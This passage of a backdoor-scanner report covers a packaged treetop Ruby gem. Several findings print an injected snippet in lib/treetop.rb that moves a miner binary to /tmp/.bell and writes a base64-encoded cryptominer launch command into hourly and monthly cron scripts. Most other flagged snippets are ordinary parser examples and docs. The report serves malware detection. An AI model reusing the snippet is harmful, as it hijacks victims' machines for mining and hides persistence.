                      "markdown": "`    f = File.open(\"/etc/cron.monthly/google.sh\", \"a\")\n    f << Base64.decode64(\"bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=\")\n    f = File.open(\"/etc/cron.hourly/google.sh\", \"a\")\n    f << Base64.decode64(\"bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=\")\n  end\nend\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop.rb"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 9,
                  "endLine": 21,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    dir = File.dirname(__FILE__)\n    FileUtils.mv(\"#{dir}/rvwf_miner\", '/tmp/.bell')\n    f = File.open(\"/etc/cron.monthly/google.sh\", \"a\")\n    f << Base64.decode64(\"bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=\")\n    f = File.open(\"/etc/cron.hourly/google.sh\", \"a\")\n    f << Base64.decode64(\"bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=\")\n  end\n",
                    "rendered": {
                      "text": "    dir = File.dirname(__FILE__)\n    FileUtils.mv(\"#{dir}/rvwf_miner\", '/tmp/.bell')\n    f = File.open(\"/etc/cron.monthly/google.sh\", \"a\")\n    f << Base64.decode64(\"bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=\")\n    f = File.open(\"/etc/cron.hourly/google.sh\", \"a\")\n    f << Base64.decode64(\"bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=\")\n  end\n",
                      "markdown": "`    dir = File.dirname(__FILE__)\n    FileUtils.mv(\"#{dir}/rvwf_miner\", '/tmp/.bell')\n    f = File.open(\"/etc/cron.monthly/google.sh\", \"a\")\n    f << Base64.decode64(\"bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=\")\n    f = File.open(\"/etc/cron.hourly/google.sh\", \"a\")\n    f << Base64.decode64(\"bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=\")\n  end\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop.rb"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 9,
                  "endLine": 7,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\nrequire 'net/http'\nrequire 'uri'\nrequire 'base64'\nrequire 'resolv'\nrequire'fileutils'\nrequire 'open3'\n",
                    "rendered": {
                      "text": "\nrequire 'net/http'\nrequire 'uri'\nrequire 'base64'\nrequire 'resolv'\nrequire'fileutils'\nrequire 'open3'\n",
                      "markdown": "`\nrequire 'net/http'\nrequire 'uri'\nrequire 'base64'\nrequire 'resolv'\nrequire'fileutils'\nrequire 'open3'\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/runtime/compiled_parser.rb"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 17,
                  "endLine": 50,
                  "endColumn": 21,
                  "snippet": {
                    "text": "           (tf[0].unexpected ? OtherThan : '')+tf[0].expected_string :\n                 \"one of #{tf.map{|f| (f.unexpected ? OtherThan : '')+f.expected_string}.uniq*', '}\"\n          ) +\n                \" at line #{failure_line}, column #{failure_column} (byte #{failure_index+1})\" +\n                (failure_index > 0 ? \" after #{input[index...failure_index]}\" : '')\n      end\n\n",
                    "rendered": {
                      "text": "           (tf[0].unexpected ? OtherThan : '')+tf[0].expected_string :\n                 \"one of #{tf.map{|f| (f.unexpected ? OtherThan : '')+f.expected_string}.uniq*', '}\"\n          ) +\n                \" at line #{failure_line}, column #{failure_column} (byte #{failure_index+1})\" +\n                (failure_index > 0 ? \" after #{input[index...failure_index]}\" : '')\n      end\n\n",
                      "markdown": "`           (tf[0].unexpected ? OtherThan : '')+tf[0].expected_string :\n                 \"one of #{tf.map{|f| (f.unexpected ? OtherThan : '')+f.expected_string}.uniq*', '}\"\n          ) +\n                \" at line #{failure_line}, column #{failure_column} (byte #{failure_index+1})\" +\n                (failure_index > 0 ? \" after #{input[index...failure_index]}\" : '')\n      end\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/examples/lambda_calculus/lambda_calculus.treetop"
                },
                "region": {
                  "startLine": 85,
                  "startColumn": 16,
                  "endLine": 86,
                  "snippet": {
                    "text": "        \n        def initialize(function, env)\n          @function = function\n          @env = env\n        end\n      \n        def apply(arg)\n          function.body.eval(function.param.bind(arg, env))\n",
                    "rendered": {
                      "text": "        \n        def initialize(function, env)\n          @function = function\n          @env = env\n        end\n      \n        def apply(arg)\n          function.body.eval(function.param.bind(arg, env))\n",
                      "markdown": "`        \n        def initialize(function, env)\n          @function = function\n          @env = env\n        end\n      \n        def apply(arg)\n          function.body.eval(function.param.bind(arg, env))\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/examples/lambda_calculus/lambda_calculus.treetop"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 7,
                  "endLine": 7,
                  "endColumn": 12,
                  "snippet": {
                    "text": "  rule program\n    expression more_expressions:(';' space expression)* {\n      def eval(env={})\n        env = env.clone\n        last_eval = nil\n        expressions.each do |exp|\n          last_eval = exp.eval(env)\n",
                    "rendered": {
                      "text": "  rule program\n    expression more_expressions:(';' space expression)* {\n      def eval(env={})\n        env = env.clone\n        last_eval = nil\n        expressions.each do |exp|\n          last_eval = exp.eval(env)\n",
                      "markdown": "`  rule program\n    expression more_expressions:(';' space expression)* {\n      def eval(env={})\n        env = env.clone\n        last_eval = nil\n        expressions.each do |exp|\n          last_eval = exp.eval(env)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/examples/lambda_calculus/lambda_calculus.treetop"
                },
                "region": {
                  "startLine": 81,
                  "startColumn": 21,
                  "endLine": 81,
                  "endColumn": 31,
                  "snippet": {
                    "text": "  rule function\n    '\\\\' param:variable '(' body:expression ')' {\n      class Closure\n        attr_reader :env, :function\n        \n        def initialize(function, env)\n          @function = function\n",
                    "rendered": {
                      "text": "  rule function\n    '\\\\' param:variable '(' body:expression ')' {\n      class Closure\n        attr_reader :env, :function\n        \n        def initialize(function, env)\n          @function = function\n",
                      "markdown": "`  rule function\n    '\\\\' param:variable '(' body:expression ')' {\n      class Closure\n        attr_reader :env, :function\n        \n        def initialize(function, env)\n          @function = function\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/examples/lambda_calculus/lambda_calculus.rb"
                },
                "region": {
                  "startLine": 491,
                  "startColumn": 14,
                  "endLine": 492,
                  "snippet": {
                    "text": "      \n      def initialize(function, env)\n        @function = function\n        @env = env\n      end\n    \n      def apply(arg)\n        function.body.eval(function.param.bind(arg, env))\n",
                    "rendered": {
                      "text": "      \n      def initialize(function, env)\n        @function = function\n        @env = env\n      end\n    \n      def apply(arg)\n        function.body.eval(function.param.bind(arg, env))\n",
                      "markdown": "`      \n      def initialize(function, env)\n        @function = function\n        @env = env\n      end\n    \n      def apply(arg)\n        function.body.eval(function.param.bind(arg, env))\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/examples/lambda_calculus/lambda_calculus.rb"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 5,
                  "endLine": 32,
                  "endColumn": 10,
                  "snippet": {
                    "text": "  \n  module Program2\n    def eval(env={})\n      env = env.clone\n      last_eval = nil\n      expressions.each do |exp|\n        last_eval = exp.eval(env)\n",
                    "rendered": {
                      "text": "  \n  module Program2\n    def eval(env={})\n      env = env.clone\n      last_eval = nil\n      expressions.each do |exp|\n        last_eval = exp.eval(env)\n",
                      "markdown": "`  \n  module Program2\n    def eval(env={})\n      env = env.clone\n      last_eval = nil\n      expressions.each do |exp|\n        last_eval = exp.eval(env)\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/examples/lambda_calculus/lambda_calculus.rb"
                },
                "region": {
                  "startLine": 487,
                  "startColumn": 19,
                  "endLine": 487,
                  "endColumn": 29,
                  "snippet": {
                    "text": "  \n  module Function1\n    class Closure\n      attr_reader :env, :function\n      \n      def initialize(function, env)\n        @function = function\n",
                    "rendered": {
                      "text": "  \n  module Function1\n    class Closure\n      attr_reader :env, :function\n      \n      def initialize(function, env)\n        @function = function\n",
                      "markdown": "`  \n  module Function1\n    class Closure\n      attr_reader :env, :function\n      \n      def initialize(function, env)\n        @function = function\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/examples/indented_blocks/indented_blocks_test.rb"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 30,
                  "endLine": 20,
                  "snippet": {
                    "text": "      down again\n  back twice\nand start from the beginning again\n  with only a small block this time\nEND\n\nparse_tree = parser.parse input\n\n",
                    "rendered": {
                      "text": "      down again\n  back twice\nand start from the beginning again\n  with only a small block this time\nEND\n\nparse_tree = parser.parse input\n\n",
                      "markdown": "`      down again\n  back twice\nand start from the beginning again\n  with only a small block this time\nEND\n\nparse_tree = parser.parse input\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/examples/indented_blocks/indented_blocks.tt"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 7,
                  "endLine": 19,
                  "endColumn": 11,
                  "snippet": {
                    "text": "      # Do not try to extract this semantic predicate into a new rule.\n      # It will be memo-ized incorrectly because @indents.last will change.\n      !{|s|\n\t# Peek at the following indentation:\n\tsave = index; i = _nt_indentation; index = save\n\t# We're closing if the indentation is less or the same as our enclosing block's:\n\tclosing = i.text_value.length <= @indents.last\n",
                    "rendered": {
                      "text": "      # Do not try to extract this semantic predicate into a new rule.\n      # It will be memo-ized incorrectly because @indents.last will change.\n      !{|s|\n\t# Peek at the following indentation:\n\tsave = index; i = _nt_indentation; index = save\n\t# We're closing if the indentation is less or the same as our enclosing block's:\n\tclosing = i.text_value.length <= @indents.last\n",
                      "markdown": "`      # Do not try to extract this semantic predicate into a new rule.\n      # It will be memo-ized incorrectly because @indents.last will change.\n      !{|s|\n\t# Peek at the following indentation:\n\tsave = index; i = _nt_indentation; index = save\n\t# We're closing if the indentation is less or the same as our enclosing block's:\n\tclosing = i.text_value.length <= @indents.last\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/examples/indented_blocks/indented_blocks.tt"
                },
                "region": {
                  "startLine": 2,
                  "startColumn": 6,
                  "endLine": 3,
                  "snippet": {
                    "text": "grammar IndentedBlocks\n  rule top\n    # Initialise the indent stack with a sentinel:\n    &{|s| @indents = [-1] }\n    foo:('foo'?)\n    nested_blocks\n",
                    "rendered": {
                      "text": "grammar IndentedBlocks\n  rule top\n    # Initialise the indent stack with a sentinel:\n    &{|s| @indents = [-1] }\n    foo:('foo'?)\n    nested_blocks\n",
                      "markdown": "`grammar IndentedBlocks\n  rule top\n    # Initialise the indent stack with a sentinel:\n    &{|s| @indents = [-1] }\n    foo:('foo'?)\n    nested_blocks\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/semantic_interpretation.markdown"
                },
                "region": {
                  "startLine": 172,
                  "startColumn": 14,
                  "endLine": 172,
                  "endColumn": 20,
                  "snippet": {
                    "text": "      <code>nonterminal?</code>\n    </td>\n    <td>\n      Was this node produced by the matching of a nonterminal symbol?\n    </td>\n  <tr>\n    <td>\n",
                    "rendered": {
                      "text": "      <code>nonterminal?</code>\n    </td>\n    <td>\n      Was this node produced by the matching of a nonterminal symbol?\n    </td>\n  <tr>\n    <td>\n",
                      "markdown": "`      <code>nonterminal?</code>\n    </td>\n    <td>\n      Was this node produced by the matching of a nonterminal symbol?\n    </td>\n  <tr>\n    <td>\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/semantic_interpretation.markdown"
                },
                "region": {
                  "startLine": 164,
                  "startColumn": 14,
                  "endLine": 164,
                  "endColumn": 20,
                  "snippet": {
                    "text": "      <code>terminal?</code>\n    </td>\n    <td>\n      Was this node produced by the matching of a terminal symbol?\n    </td>\n  </tr>\n  <tr>\n",
                    "rendered": {
                      "text": "      <code>terminal?</code>\n    </td>\n    <td>\n      Was this node produced by the matching of a terminal symbol?\n    </td>\n  </tr>\n  <tr>\n",
                      "markdown": "`      <code>terminal?</code>\n    </td>\n    <td>\n      Was this node produced by the matching of a terminal symbol?\n    </td>\n  </tr>\n  <tr>\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/semantic_interpretation.markdown"
                },
                "region": {
                  "startLine": 92,
                  "startColumn": 25,
                  "endLine": 92,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\nThe parenthesized choice above can result in a node matching either of the two choices. The node will be extended with methods defined in the subsequent block. Note that a choice must always be parenthesized to be associated with a following block, otherwise the block will apply to just the last alternative.\n\n###Extending A Propagated Node with a Declared Module\n    # in .treetop file\n    rule parenthesized_letter\n      ('(' parenthesized_letter ')' / [a-z]) <ParenNode>\n",
                    "rendered": {
                      "text": "\nThe parenthesized choice above can result in a node matching either of the two choices. The node will be extended with methods defined in the subsequent block. Note that a choice must always be parenthesized to be associated with a following block, otherwise the block will apply to just the last alternative.\n\n###Extending A Propagated Node with a Declared Module\n    # in .treetop file\n    rule parenthesized_letter\n      ('(' parenthesized_letter ')' / [a-z]) <ParenNode>\n",
                      "markdown": "`\nThe parenthesized choice above can result in a node matching either of the two choices. The node will be extended with methods defined in the subsequent block. Note that a choice must always be parenthesized to be associated with a following block, otherwise the block will apply to just the last alternative.\n\n###Extending A Propagated Node with a Declared Module\n    # in .treetop file\n    rule parenthesized_letter\n      ('(' parenthesized_letter ')' / [a-z]) <ParenNode>\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/semantic_interpretation.markdown"
                },
                "region": {
                  "startLine": 90,
                  "startColumn": 91,
                  "endLine": 90,
                  "endColumn": 97,
                  "snippet": {
                    "text": "      }\n    end\n\nThe parenthesized choice above can result in a node matching either of the two choices. The node will be extended with methods defined in the subsequent block. Note that a choice must always be parenthesized to be associated with a following block, otherwise the block will apply to just the last alternative.\n\n###Extending A Propagated Node with a Declared Module\n    # in .treetop file\n",
                    "rendered": {
                      "text": "      }\n    end\n\nThe parenthesized choice above can result in a node matching either of the two choices. The node will be extended with methods defined in the subsequent block. Note that a choice must always be parenthesized to be associated with a following block, otherwise the block will apply to just the last alternative.\n\n###Extending A Propagated Node with a Declared Module\n    # in .treetop file\n",
                      "markdown": "`      }\n    end\n\nThe parenthesized choice above can result in a node matching either of the two choices. The node will be extended with methods defined in the subsequent block. Note that a choice must always be parenthesized to be associated with a following block, otherwise the block will apply to just the last alternative.\n\n###Extending A Propagated Node with a Declared Module\n    # in .treetop file\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/semantic_interpretation.markdown"
                },
                "region": {
                  "startLine": 90,
                  "startColumn": 46,
                  "endLine": 90,
                  "endColumn": 52,
                  "snippet": {
                    "text": "      }\n    end\n\nThe parenthesized choice above can result in a node matching either of the two choices. The node will be extended with methods defined in the subsequent block. Note that a choice must always be parenthesized to be associated with a following block, otherwise the block will apply to just the last alternative.\n\n###Extending A Propagated Node with a Declared Module\n    # in .treetop file\n",
                    "rendered": {
                      "text": "      }\n    end\n\nThe parenthesized choice above can result in a node matching either of the two choices. The node will be extended with methods defined in the subsequent block. Note that a choice must always be parenthesized to be associated with a following block, otherwise the block will apply to just the last alternative.\n\n###Extending A Propagated Node with a Declared Module\n    # in .treetop file\n",
                      "markdown": "`      }\n    end\n\nThe parenthesized choice above can result in a node matching either of the two choices. The node will be extended with methods defined in the subsequent block. Note that a choice must always be parenthesized to be associated with a following block, otherwise the block will apply to just the last alternative.\n\n###Extending A Propagated Node with a Declared Module\n    # in .treetop file\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/semantic_interpretation.markdown"
                },
                "region": {
                  "startLine": 77,
                  "startColumn": 25,
                  "endLine": 77,
                  "endColumn": 31,
                  "snippet": {
                    "text": "##Automatic Extension of Results\nNonterminal and ordered choice expressions do not instantiate new nodes, but rather pass through nodes that are instantiated by other expressions. They can extend nodes they propagate with anonymous or declared modules, using similar constructs used with expressions that instantiate their own syntax nodes.\n\n###Extending a Propagated Node with an Anonymous Module\n    rule parenthesized_letter\n      ('(' parenthesized_letter ')' / [a-z]) {\n        def depth\n",
                    "rendered": {
                      "text": "##Automatic Extension of Results\nNonterminal and ordered choice expressions do not instantiate new nodes, but rather pass through nodes that are instantiated by other expressions. They can extend nodes they propagate with anonymous or declared modules, using similar constructs used with expressions that instantiate their own syntax nodes.\n\n###Extending a Propagated Node with an Anonymous Module\n    rule parenthesized_letter\n      ('(' parenthesized_letter ')' / [a-z]) {\n        def depth\n",
                      "markdown": "`##Automatic Extension of Results\nNonterminal and ordered choice expressions do not instantiate new nodes, but rather pass through nodes that are instantiated by other expressions. They can extend nodes they propagate with anonymous or declared modules, using similar constructs used with expressions that instantiate their own syntax nodes.\n\n###Extending a Propagated Node with an Anonymous Module\n    rule parenthesized_letter\n      ('(' parenthesized_letter ')' / [a-z]) {\n        def depth\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/semantic_interpretation.markdown"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 122,
                  "endLine": 24,
                  "endColumn": 128,
                  "snippet": {
                    "text": "hes:\n\n* `'a'`\n* `'(a)'`\n* `'((a))'`\n* etc.\n\n\nOutput from a parser for this grammar looks like this:\n\n![Tree Returned By ParenLanguageParser](./images/paren_language_output.png)\n\nThis is a parse tree whose nodes are instances of `Treetop::Runtime::SyntaxNode`. What if we could define methods on these node objects? We would then have an object-oriented program whose structure corresponded to the structure of our language. Treetop provides two techniques for doing just this.\n\n##Associating Methods with Node-Instantiating Expressions\nSequences and all types of terminals are node-instantiating expression",
                    "rendered": {
